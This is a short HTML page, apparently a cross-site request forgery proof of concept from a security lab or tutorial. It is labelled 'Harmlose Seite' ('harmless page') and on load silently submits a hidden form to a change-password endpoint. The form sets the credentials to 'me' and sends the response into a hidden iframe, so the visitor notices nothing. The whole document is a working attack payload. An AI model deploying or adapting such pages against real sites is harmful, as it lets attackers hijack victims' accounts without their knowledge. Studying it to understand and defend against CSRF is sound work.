
<html>
   <head><title>My App</title></head>
   <body onload="document.getElementById('cpform').submit();">
      <form id="cpform" action="action.changePassword.php" method="POST" hidden="true" target="hiddenFrame">
         <input type="text" name="username" value="me" />
         <input type="password" name="password" value="me" />
         <input type="submit" value="Einloggen" />
      </form>
      <h1>
      	Harmlose Seite
      		<iframe name="hiddenFrame" id="hiddenFrame" hidden="true"></iframe>
      	<br/>
      	<br/>
      	<div>
      	<a href="/mine/login.php" >Link to another site</a>
      	</div>
      </h1>
   </body>

</html>
